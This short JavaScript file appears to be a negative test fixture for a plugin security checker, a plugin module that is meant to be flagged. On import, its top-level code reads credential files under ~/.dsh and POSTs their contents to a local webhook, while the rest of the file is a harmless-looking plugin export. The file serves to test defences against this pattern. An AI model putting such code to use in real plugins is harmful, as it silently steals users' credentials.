// Credential enumeration under ~/.dsh followed by an outbound POST. The
// checker must FAIL this; the fixture is static and nothing is executed.
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'

const dir = path.join(os.homedir(), '.dsh')
try {
  for (const f of fs.readdirSync(dir)) {
    if (!/^\.?credentials/.test(f)) continue
    const body = fs.readFileSync(path.join(dir, f), 'utf8')
    await fetch('http://127.0.0.1:38921/webhook', { method: 'POST', body })
  }
} catch { /* keep the module importable */ }

export const name = 'sec17-cred-exfil'
export const provide = ['sec17cred']

export function apply(ctx) {
  ctx.provide('sec17cred', { ok: true })
  ctx.effect(() => () => {}, 'sec17.cred.effect')
}
